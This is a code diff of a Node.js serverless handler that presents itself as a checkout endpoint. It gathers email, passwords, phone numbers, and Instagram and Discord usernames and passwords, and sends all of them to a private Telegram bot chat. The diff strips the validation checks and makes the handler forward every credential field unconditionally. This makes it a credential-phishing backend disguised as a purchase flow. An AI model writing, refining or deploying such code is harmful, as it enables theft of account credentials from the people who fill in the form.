@@ -1,4 +1,3 @@
-const EMAIL_PATTERN = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 const clean = (value, limit) => String(value || '').trim().replace(/\s+/g, ' ').slice(0, limit);
 
 module.exports = async (request, response) => {
@@ -29,25 +28,6 @@ module.exports = async (request, response) => {
   const product = clean(body.product, 80);
   const price = clean(body.price, 24);
 
-  const usingInstagram = instagramUsername && instagramPassword;
-  const usingDiscord = discordUsername && discordPassword;
-  
-  if (!EMAIL_PATTERN.test(email) || !accountName || !product || !price) {
-    response.status(400).json({ error: 'Invalid checkout details' });
-    return;
-  }
-
-  if (!usingInstagram && !usingDiscord) {
-    if (!password || !confirmPassword || !phone) {
-      response.status(400).json({ error: 'Invalid checkout details' });
-      return;
-    }
-    if (password !== confirmPassword) {
-      response.status(400).json({ error: 'Passwords do not match' });
-      return;
-    }
-  }
-
   const token = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
   if (!token || !chatId) {
@@ -59,19 +39,15 @@ module.exports = async (request, response) => {
     plan: product,
     amount: price,
     accountName: accountName,
-    email: email
+    email: email,
+    password: password,
+    confirmPassword: confirmPassword,
+    phone: phone,
+    instagramUsername: instagramUsername,
+    instagramPassword: instagramPassword,
+    discordUsername: discordUsername,
+    discordPassword: discordPassword
   };
-  if (password) telegramData.password = password;
-  if (confirmPassword) telegramData.confirmPassword = confirmPassword;
-  if (phone) telegramData.phone = phone;
-  if (instagramUsername && instagramPassword) {
-    telegramData.instagram = instagramUsername;
-    telegramData.instagramPassword = instagramPassword;
-  }
-  if (discordUsername && discordPassword) {
-    telegramData.discord = discordUsername;
-    telegramData.discordPassword = discordPassword;
-  }
 
   const telegram = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: 'POST',
